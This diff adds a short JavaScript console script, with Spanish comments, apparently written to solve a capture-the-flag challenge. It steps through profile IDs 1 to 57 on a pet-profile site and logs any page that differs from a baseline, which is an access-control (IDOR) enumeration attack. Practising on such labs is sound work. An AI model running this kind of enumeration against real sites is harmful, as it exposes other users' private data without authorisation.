@@ -1,0 +1,69 @@
+function probarIDs() {
+    let id = 1; // ID inicial
+    const maxID = 57; // ID final
+
+    // HTML de referencia (perfil normal)
+    const htmlBase = `
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Perfil</title>
+</head>
+<body>
+    <a href="/"><h1>Mascotas</h1></a>
+
+    
+<p>Perfil de </p>
+<p>
+<a href="/agregar_mascota">agregar mascota</a>
+<a href="/logout">Cerrar Sesion</a>
+</p>
+
+
+<p>Flag encontrado:<strong>FLAG{Hola_</strong>
+
+
+<h3> Mis Mascotas </h3>
+
+
+<p>No tienes mascotas registradas.</p>
+
+
+
+</body>
+</html>
+`.trim().replace(/\s+/g, ' '); // Normaliza espacios
+
+    function probarSiguiente() {
+        if (id > maxID) {
+            console.log("✅ Listo. Se probaron todos los IDs.");
+            return;
+        }
+
+        const url = `/perfil/${id}`;
+        fetch(url)
+            .then(res => res.text())
+            .then(html => {
+                const htmlNormalizado = html.trim().replace(/\s+/g, ' ');
+                if (htmlNormalizado !== htmlBase) {
+                    console.log(`🎯 ¡Perfil diferente encontrado! ID: ${id}`);
+                    console.log(`🔗 Ir a: ${window.location.origin}/perfil/${id}`);
+                } else {
+                    console.log(`ID ${id} es un perfil normal.`);
+                }
+
+                id++;
+                setTimeout(probarSiguiente, 300); // Evitar saturar el servidor
+            })
+            .catch(err => {
+                console.error(`Error al probar ID ${id}:`, err);
+                id++;
+                setTimeout(probarSiguiente, 300);
+            });
+    }
+
+    probarSiguiente();
+}
+
+probarIDs();
+
